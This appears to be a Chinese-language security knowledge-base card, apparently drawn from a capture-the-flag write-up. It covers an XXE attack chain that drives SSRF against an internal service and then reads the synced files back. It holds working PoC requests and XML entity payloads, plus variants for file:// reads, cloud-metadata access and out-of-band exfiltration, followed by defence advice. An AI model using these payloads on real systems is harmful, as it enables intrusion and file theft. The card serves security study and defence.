---
id: web-generic-xxe-reflected-xml-ssrf-internal-service
title: 反射 XML 注释注入 XXE 驱动内网服务 SSRF 并二次读取文件
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-ssrf-internal-service-chain
aliases:
- 注释闭合注入 DOCTYPE
- 反射 XML XXE
- XXE SSRF 内网接口
- 二次 XXE 文件同步
tags:
- web
- xxe
- ssrf
- xml
- internal-service
- file-read
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:19:38+08:00'
  notes: 已对照原文与图片08/10/11/12核对：render_xml 将 author 拼入XML注释，author=--><!DOCTYPE...><!-- 可注入DOCTYPE/ENTITY，content=&xxe; 触发外部实体；图10 access.log证实 viewer:5000 的 /create 与 render 通信；图11/12证实 /app/docxTemplates 下 flag.txt 与经 /ops/sync 上传的 galf 文件可被 artifact 接口读取。卡内 author/content payload、SSRF到 /ops/sync、二次文件读取链与原文一致。PoC未本机执行；frontmatter无sources/source_url。
---

## 一句话结论

服务端把用户输入拼进 XML 字符串并解析时，可用 `-->` 提前闭合注释再注入 `DOCTYPE/ENTITY`；构造 `&xxe;` 触发解析器向仅内网可达的接口发起请求（SSRF），再借另一条文件同步/Artifact 读取接口把结果带回，形成“XXE→SSRF→内网文件同步→读取”的链。

## 原理

- 目标用字符串模板生成 XML：`<!-- post by {author} -->`、`<content>{content}</content>`，随后由 XML 解析器解析。`author` 未转义，可注入 `-->` 关闭注释，再写 `<!DOCTYPE doc [<!ENTITY xxe SYSTEM 'http://viewer:5000/ops/sync'>]><!--` 并用 `<!--` 重新打开注释，保证整体仍是合法 XML。
- `content=&xxe;` 引用外部实体，解析器为展开实体会对 `SYSTEM` 后的 URL 发起请求，于是从“渲染服务”向仅内网可达的 `viewer:5000` 发起 SSRF。
- 内网 `viewer` 的 `/ops/sync` 会把指定路径文件同步到渲染服务的 `/internal/upload`，后者解压到 `/app/docxTemplates/`；攻击者再用 viewer 对外的 Artifact 文件读取接口读取该目录，得到文件内容。
- 成立的关键：XML 解析器启用外部实体、用户输入进入 XML 结构、内网服务间无相互认证、且存在可被 SSRF 触发的文件搬运接口。

## 触发条件

- 应用解析包含用户输入的 XML（直接拼接字符串最典型）；
- XML 解析器允许外部实体/外部 DTD（未禁用 DTD 或未使用 defusedxml 等安全解析器）；
- 渲染节点可访问内网服务（如 `viewer:5000`）；
- 内网存在可被 GET 触发的同步/上传/读取接口，且文件最终落在攻击者可读取的目录。

## 利用步骤

1. 确认 XML 入口：提交带特殊字符的内容，观察回显或报错是否体现 XML 解析。
2. 用 `-->` 闭合注释并注入 DOCTYPE，SYSTEM 指向内网目标 URL。
3. 在正文中引用实体 `&xxe;`，触发解析器请求内网 URL。
4. 若内网接口会搬运文件，先在请求中指定目标文件路径，再通过对外文件读取接口取回。
5. 对仅回显“解析成功/失败”的目标，改用外部 DTD 与 OOB 外带（见关联卡片）。

## PoC

```http
GET /render?author=--><!DOCTYPE doc [<!ENTITY xxe SYSTEM 'http://viewer:5000/ops/sync'>]><!--&content=%26xxe%3B
```

生成的 XML 形如：

```xml
<?xml version="1.0"?>
<!-- post by --><!DOCTYPE doc [<!ENTITY xxe SYSTEM 'http://viewer:5000/ops/sync'>]><!-- -->
<doc>
<content>&xxe;</content>
<hide>0</hide>
</doc>
```

二次读取（viewer 对外接口）：

```http
GET /api/v1/artifacts?path=/app/docxTemplates&filename=flag.txt
```

变体：把 SYSTEM 指向 `http://viewer:5000/ops/sync?path=/galf`，让内网服务把目标文件同步到渲染目录后再读取。

## 变体与关联

- 盲 XXE 无回显时，用外部 DTD + 参数实体把内容拼进 URL 外带（见同目录“盲 XXE 的 OOB 外带”）。
- 可用 `file://` 直接读本地文件；用 `http://169.254.169.254/...` 尝试云元数据（受解析器协议支持与网络策略限制）。
- 与 SSRF 卡片关联：XXE 本质是“解析器替攻击者发请求”，可复用 SSRF 的内网探测与协议技巧。
- 若解析器禁止外部实体但允许 XInclude，可尝试 XInclude 注入。

## 检测与防御

- 解析 XML 前禁用 DOCTYPE/外部实体：PHP 用 `libxml_disable_entity_loader(true)`（旧版本）或安全解析选项；Python 用 `defusedxml`；Java 设置 `disallow-doctype-decl`、`external-general-entities=false`、`external-parameter-entities=false`。
- 不要用字符串拼接 XML；使用 XML 库构造节点并对文本做转义。
- 内网服务间加认证（mTLS/服务令牌），限制渲染节点出网与内网访问范围。
- 文件同步/Artifact 接口只允许白名单目录，读取前做 realpath 前缀校验，禁止绝对路径。
- 日志与 WAF 检测 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`--&gt;` 等异常 XML 结构。
